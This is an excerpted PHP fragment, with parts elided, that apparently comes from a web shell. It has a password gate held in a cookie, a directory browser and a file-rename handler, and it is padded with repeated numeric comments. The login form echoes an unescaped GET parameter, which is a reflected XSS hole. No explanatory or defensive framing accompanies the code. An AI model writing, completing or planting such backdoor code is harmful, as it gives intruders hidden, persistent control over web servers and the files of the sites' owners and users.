...
$pass = false;
if (isset($_COOKIE['pw_name_96349'])) {
    if(($_COOKIE['pw_name_96349']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_96349'])) {
        if(($_POST['pw_name_96349']) == $auth_key) {
            setcookie("pw_name_96349", $_POST['pw_name_96349']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_96349' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774179562 1724682774957798 1724682774754809 1724682774999301
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774179562 1724682774957798 1724682774754809 1724682774999301
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774179562 1724682774957798 1724682774754809 1724682774999301
            $name = PATH . "/" . $_GET['r'];
